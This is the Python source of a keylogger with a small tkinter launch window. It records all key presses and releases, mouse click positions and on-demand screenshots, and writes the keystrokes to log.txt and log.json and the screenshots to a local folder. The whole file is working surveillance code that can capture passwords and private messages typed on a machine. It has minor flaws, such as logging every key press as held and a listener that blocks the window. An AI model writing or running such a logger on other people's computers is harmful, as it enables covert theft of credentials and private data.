import json
import os
from pynput import keyboard
from pynput import mouse
from PIL import ImageGrab
import tkinter as tk

key_list = []
x = False
key_strokes = ""
screenshot_count = 0

def update_txt_file(key):
    with open('log.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('log.json', 'w') as key_log:
        json.dump(key_list, key_log)

def capture_screenshot():
    global screenshot_count
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshots/screenshot_{screenshot_count}.png")
    screenshot_count += 1

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': str(key)})
        x = True
    if x == True:
        key_list.append({'Held': str(key)})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': str(key)})
    if x == True:
        x = False
    update_json_file(key_list)
    key_strokes += str(key)
    update_txt_file(key_strokes)

def on_click(x, y, button, pressed):
    if pressed:
        key_list.append({'Mouse': f"Clicked at ({x}, {y})"})
        update_json_file(key_list)

def start_keylogger():
    print("[+] Running keylogger successfully:\n[1] Saving the files in 'log.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main_window():
    window = tk.Tk()
    window.title("Keylogger")
    window.geometry("300x150")
    window.configure(bg='white')

    start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger, bg='blue', fg='white', font=('Arial', 12))
    start_button.pack(pady=10)

    screenshot_button = tk.Button(window, text="Capture Screenshot", command=capture_screenshot, bg='green', fg='white', font=('Arial', 12))
    screenshot_button.pack(pady=10)

    window.mainloop()

if __name__ == "__main__":
    # Create a directory to store the screenshots
    if not os.path.exists("screenshots"):
        os.makedirs("screenshots")

    # Start capturing mouse clicks
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    main_window()
